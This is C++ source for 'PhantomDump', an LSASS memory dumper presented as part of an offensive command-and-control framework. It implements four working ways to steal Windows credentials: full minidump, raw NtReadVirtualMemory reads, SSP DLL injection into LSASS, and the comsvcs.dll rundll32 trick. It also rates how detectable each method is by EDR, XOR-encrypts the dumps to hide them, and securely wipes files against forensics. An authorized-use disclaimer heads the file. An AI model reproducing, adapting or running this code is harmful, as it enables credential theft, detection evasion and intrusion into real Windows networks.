/*
 * PhantomDump v5.2 — LSASS Memory Dumper
 * Part of the PhantomShell C2 Framework
 *
 * AUTHORIZED USE ONLY. This tool is provided for use in sanctioned
 * penetration testing engagements and authorized red-team operations.
 * Unauthorized access to computer systems is illegal. The authors assume
 * no liability for misuse of this software. You must have explicit
 * written permission from the system owner before using this tool.
 *
 * Copyright (c) PhantomShell Project — All rights reserved.
 */

#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <sstream>

#include "../common/ntapi.h"
#include "../common/utils.h"

#pragma comment(lib, "dbghelp")
#pragma comment(lib, "advapi32")

// ─── Region header for raw memory dump (Method 2) ────────────────────────────
struct MemoryRegionHeader {
    ULONG_PTR baseAddress;
    SIZE_T    regionSize;
};

// ─── EnableDebugPrivilege ────────────────────────────────────────────────────
// Elevates the current process token to hold SeDebugPrivilege, which is
// required to open LSASS with PROCESS_ALL_ACCESS.
bool EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        fprintf(stderr, "[-] OpenProcessToken failed (error %lu)\n", GetLastError());
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        fprintf(stderr, "[-] LookupPrivilegeValue failed (error %lu)\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        fprintf(stderr, "[-] AdjustTokenPrivileges failed (error %lu)\n", GetLastError());
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[-] SeDebugPrivilege not assigned — are you running as admin?\n");
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    printf("[+] SeDebugPrivilege enabled\n");
    return true;
}

// ─── FindLsassPID ────────────────────────────────────────────────────────────
// Walks the process list via a toolhelp snapshot and returns the PID of
// lsass.exe (case-insensitive match). Returns 0 on failure.
DWORD FindLsassPID() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateToolhelp32Snapshot failed (error %lu)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(hSnap, &pe)) {
        fprintf(stderr, "[-] Process32First failed (error %lu)\n", GetLastError());
        CloseHandle(hSnap);
        return 0;
    }

    DWORD pid = 0;
    do {
        // Case-insensitive comparison
        if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnap, &pe));

    CloseHandle(hSnap);

    if (pid == 0) {
        fprintf(stderr, "[-] lsass.exe not found in process list\n");
    } else {
        printf("[+] Found lsass.exe — PID %lu\n", pid);
    }
    return pid;
}

// ─── EncryptAndWriteDump ─────────────────────────────────────────────────────
// Reads the raw dump file at `srcPath`, XOR-encrypts it with the given key
// using PhantomUtils::XorCrypt, writes the encrypted content to srcPath + ".enc",
// and securely deletes the original plaintext dump.
bool EncryptAndWriteDump(const std::string& srcPath, const std::string& xorKey) {
    HANDLE hFile = CreateFileA(srcPath.c_str(), GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] EncryptAndWriteDump: cannot open source %s (error %lu)\n",
                srcPath.c_str(), GetLastError());
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        fprintf(stderr, "[-] GetFileSize failed (error %lu)\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }

    std::vector<unsigned char> buffer(fileSize);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        fprintf(stderr, "[-] ReadFile failed (error %lu)\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }
    CloseHandle(hFile);

    // XOR-encrypt using the PhantomUtils helper
    PhantomUtils::XorCrypt(buffer.data(), buffer.size(),
                           reinterpret_cast<const uint8_t*>(xorKey.data()), xorKey.size());

    // Write encrypted dump to .enc file
    std::string encPath = srcPath + ".enc";
    HANDLE hOut = CreateFileA(encPath.c_str(), GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] Cannot create encrypted file %s (error %lu)\n",
                encPath.c_str(), GetLastError());
        return false;
    }

    DWORD bytesWritten = 0;
    if (!WriteFile(hOut, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesWritten, NULL)) {
        fprintf(stderr, "[-] WriteFile failed (error %lu)\n", GetLastError());
        CloseHandle(hOut);
        return false;
    }
    CloseHandle(hOut);

    // Delete the original unencrypted dump
    if (!DeleteFileA(srcPath.c_str())) {
        fprintf(stderr, "[!] Warning: could not delete original dump %s (error %lu)\n",
                srcPath.c_str(), GetLastError());
    }

    printf("[+] Dump encrypted -> %s\n", encPath.c_str());
    return true;
}

// ─── SecureCleanup ───────────────────────────────────────────────────────────
// Overwrites the file at `path` with zeros and then deletes it, preventing
// trivial forensic recovery.
void SecureCleanup(const std::string& path) {
    printf("[*] Securely deleting %s\n", path.c_str());
    PhantomUtils::SecureDelete(path);
    printf("[+] File securely deleted\n");
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Method 1 — MiniDumpWriteDump (standard)
//  Detection: high — calls well-known API, easily hooked by EDR/AV.
// ═══════════════════════════════════════════════════════════════════════════════
bool DumpMethodMiniDump(DWORD pid, const std::string& outPath) {
    printf("[*] Method 1: MiniDumpWriteDump\n");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        fprintf(stderr, "[-] OpenProcess failed (error %lu)\n", GetLastError());
        return false;
    }

    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFile failed for output %s (error %lu)\n",
                outPath.c_str(), GetLastError());
        CloseHandle(hProcess);
        return false;
    }

    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile,
                                     MiniDumpWithFullMemory,
                                     NULL, NULL, NULL);
    if (!success) {
        fprintf(stderr, "[-] MiniDumpWriteDump failed (error %lu)\n", GetLastError());
    } else {
        printf("[+] MiniDump written to %s\n", outPath.c_str());
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);
    return success != FALSE;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Method 2 — Direct NtReadVirtualMemory
//  Detection: moderate — avoids MiniDumpWriteDump signature but still opens
//  LSASS with broad access rights. Raw dump; not minidump format.
// ═══════════════════════════════════════════════════════════════════════════════
bool DumpMethodNtRead(DWORD pid, const std::string& outPath) {
    printf("[*] Method 2: NtReadVirtualMemory (raw memory dump)\n");

    // Resolve NtReadVirtualMemory from ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[-] Cannot get ntdll.dll handle\n");
        return false;
    }

    typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

    auto NtReadVirtualMemory = reinterpret_cast<pNtReadVirtualMemory>(
        GetProcAddress(hNtdll, "NtReadVirtualMemory"));

    if (!NtReadVirtualMemory) {
        fprintf(stderr, "[-] Cannot resolve NtReadVirtualMemory (error %lu)\n", GetLastError());
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        fprintf(stderr, "[-] OpenProcess failed (error %lu)\n", GetLastError());
        return false;
    }

    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFile failed for output %s (error %lu)\n",
                outPath.c_str(), GetLastError());
        CloseHandle(hProcess);
        return false;
    }

    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR address = 0;
    SIZE_T totalBytesWritten = 0;
    DWORD regionCount = 0;

    // Walk through the entire virtual address space of the target process
    while (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(address), &mbi, sizeof(mbi))) {
        // Only read committed, readable regions
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            std::vector<unsigned char> regionBuf(mbi.RegionSize);
            SIZE_T bytesRead = 0;

            NTSTATUS status = NtReadVirtualMemory(
                hProcess,
                reinterpret_cast<PVOID>(address),
                regionBuf.data(),
                mbi.RegionSize,
                &bytesRead);

            if (status == 0 && bytesRead > 0) {
                // Write a header so the dump can be parsed later
                MemoryRegionHeader hdr;
                hdr.baseAddress = address;
                hdr.regionSize  = bytesRead;

                DWORD written = 0;
                WriteFile(hFile, &hdr, sizeof(hdr), &written, NULL);
                WriteFile(hFile, regionBuf.data(), static_cast<DWORD>(bytesRead), &written, NULL);

                totalBytesWritten += bytesRead;
                regionCount++;
            }
        }

        // Advance to the next region
        address = reinterpret_cast<ULONG_PTR>(mbi.BaseAddress) + mbi.RegionSize;
        if (address == 0) break; // Wrapped around
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);

    printf("[+] Raw dump: %lu regions, %zu bytes -> %s\n",
           regionCount, totalBytesWritten, outPath.c_str());
    return totalBytesWritten > 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Method 3 — SSP Injection via AddSecurityPackage
//  Detection: low-moderate — no direct LSASS handle open; relies on the
//  SSP DLL being loaded into LSASS by the OS. AV may flag the DLL itself.
// ═══════════════════════════════════════════════════════════════════════════════
bool DumpMethodSSP(const std::string& sspDllPath) {
    printf("[*] Method 3: SSP Injection (AddSecurityPackage)\n");

    if (sspDllPath.empty()) {
        fprintf(stderr, "[-] SSP DLL path required (-d flag)\n");
        return false;
    }

    // Verify the DLL exists before attempting injection
    DWORD attrs = GetFileAttributesA(sspDllPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[-] SSP DLL not found: %s (error %lu)\n",
                sspDllPath.c_str(), GetLastError());
        return false;
    }

    printf("[*] Loading SSP DLL: %s\n", sspDllPath.c_str());
    printf("[*] Note: The SSP DLL will be loaded into LSASS by the OS.\n");
    printf("[*]   Your SSP DLL should implement SpLsaModeInitialize and\n");
    printf("[*]   SpInitialize to intercept authentication calls. Captured\n");
    printf("[*]   credentials are typically written to a log file on disk.\n");

    SECURITY_PACKAGE_OPTIONS spo = {};
    spo.Size = sizeof(spo);
    spo.Type = SECPKG_OPTIONS_TYPE_LSA;

    SECURITY_STATUS sec = AddSecurityPackageA(
        const_cast<LPSTR>(sspDllPath.c_str()), &spo);

    if (sec != SEC_E_OK) {
        fprintf(stderr, "[-] AddSecurityPackageA failed (SECURITY_STATUS 0x%08lX)\n",
                static_cast<unsigned long>(sec));
        return false;
    }

    printf("[+] SSP DLL loaded into LSASS successfully\n");
    printf("[+] Credentials will be captured by the SSP as users authenticate.\n");
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Method 4 — Comsvcs.dll LOLBin (Living Off the Land)
//  Detection: moderate-high — uses rundll32 + comsvcs.dll which is well-known
//  and monitored by most EDRs, but avoids importing dbghelp directly.
// ═══════════════════════════════════════════════════════════════════════════════
bool DumpMethodComsvcs(DWORD pid, const std::string& outPath) {
    printf("[*] Method 4: comsvcs.dll MiniDump via rundll32 (LOLBin)\n");

    // Build the command line:
    //   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> <path> full
    std::ostringstream cmd;
    cmd << "C:\\Windows\\System32\\rundll32.exe"
        << " C:\\Windows\\System32\\comsvcs.dll, MiniDump "
        << pid << " " << outPath << " full";

    std::string cmdLine = cmd.str();
    printf("[*] Executing: %s\n", cmdLine.c_str());

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    // CreateProcess requires a mutable command-line buffer
    std::vector<char> cmdBuf(cmdLine.begin(), cmdLine.end());
    cmdBuf.push_back('\0');

    if (!CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed (error %lu)\n", GetLastError());
        return false;
    }

    // Wait for rundll32 to complete (30-second timeout)
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);
    if (waitResult == WAIT_TIMEOUT) {
        fprintf(stderr, "[-] rundll32 timed out after 30 seconds\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Verify the dump file was created
    if (GetFileAttributesA(outPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[-] Dump file not created — rundll32 exit code %lu\n", exitCode);
        return false;
    }

    printf("[+] comsvcs.dll dump written to %s\n", outPath.c_str());
    return true;
}

// ─── main ────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    int method         = 0;
    std::string outPath;
    std::string xorKey = "PhantomDump52";
    std::string sspDll;
    std::string cleanupPath;
    bool encrypt       = true;

    // ── Argument parsing ─────────────────────────────────────────────────
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-m" && i + 1 < argc)           method      = atoi(argv[++i]);
        else if (arg == "-o" && i + 1 < argc)      outPath     = argv[++i];
        else if (arg == "-k" && i + 1 < argc)      xorKey      = argv[++i];
        else if (arg == "-d" && i + 1 < argc)      sspDll      = argv[++i];
        else if (arg == "--cleanup" && i + 1 < argc) { cleanupPath = argv[++i]; }
        else if (arg == "--no-encrypt")             encrypt     = false;
    }

    printf("======================================================\n");
    printf(" [*] PhantomDump v5.2 -- LSASS Memory Dumper\n");
    printf("======================================================\n\n");

    // Handle --cleanup mode early
    if (!cleanupPath.empty()) {
        SecureCleanup(cleanupPath);
        return 0;
    }

    if (method < 1 || method > 4) {
        fprintf(stderr, "Usage: %s -m <1-4> [-o output] [-k xor_key] [-d ssp_dll] [--no-encrypt] [--cleanup path]\n", argv[0]);
        fprintf(stderr, "\nMethods:\n");
        fprintf(stderr, "  1  MiniDumpWriteDump (standard, high detection)\n");
        fprintf(stderr, "  2  NtReadVirtualMemory (raw dump, moderate detection)\n");
        fprintf(stderr, "  3  SSP Injection via AddSecurityPackage (requires -d)\n");
        fprintf(stderr, "  4  comsvcs.dll LOLBin via rundll32 (moderate-high detection)\n");
        return 1;
    }

    // ── Enable SeDebugPrivilege ──────────────────────────────────────────
    if (!EnableDebugPrivilege()) {
        fprintf(stderr, "[-] Cannot continue without SeDebugPrivilege. Run as Administrator.\n");
        return 1;
    }

    // ── Generate default output path if not provided ─────────────────────
    if (outPath.empty() && method != 3) {
        char tempDir[MAX_PATH];
        GetTempPathA(MAX_PATH, tempDir);

        SYSTEMTIME st;
        GetLocalTime(&st);

        char buf[MAX_PATH];
        snprintf(buf, sizeof(buf), "%sdebug_%04d%02d%02d_%02d%02d%02d.dmp",
                 tempDir, st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond);
        outPath = buf;
    }

    // ── Find LSASS PID (not needed for method 3) ─────────────────────────
    DWORD lsassPid = 0;
    if (method != 3) {
        lsassPid = FindLsassPID();
        if (lsassPid == 0) {
            fprintf(stderr, "[-] Cannot locate lsass.exe. Aborting.\n");
            return 1;
        }
    }

    // ── Execute selected dump method ─────────────────────────────────────
    bool success = false;
    switch (method) {
        case 1:
            success = DumpMethodMiniDump(lsassPid, outPath);
            break;
        case 2:
            success = DumpMethodNtRead(lsassPid, outPath);
            break;
        case 3:
            success = DumpMethodSSP(sspDll);
            break;
        case 4:
            success = DumpMethodComsvcs(lsassPid, outPath);
            break;
    }

    if (!success) {
        fprintf(stderr, "[-] Dump method %d failed\n", method);
        return 1;
    }

    // ── Encrypt the dump (methods 1, 2, 4 produce files) ─────────────────
    if (encrypt && method != 3) {
        if (!EncryptAndWriteDump(outPath, xorKey)) {
            fprintf(stderr, "[-] Encryption failed; raw dump may still exist at %s\n", outPath.c_str());
            return 1;
        }
        printf("[+] Output: %s.enc\n", outPath.c_str());
    } else if (method != 3) {
        printf("[+] Output: %s (unencrypted)\n", outPath.c_str());
    }

    printf("[+] Done.\n");
    return 0;
}
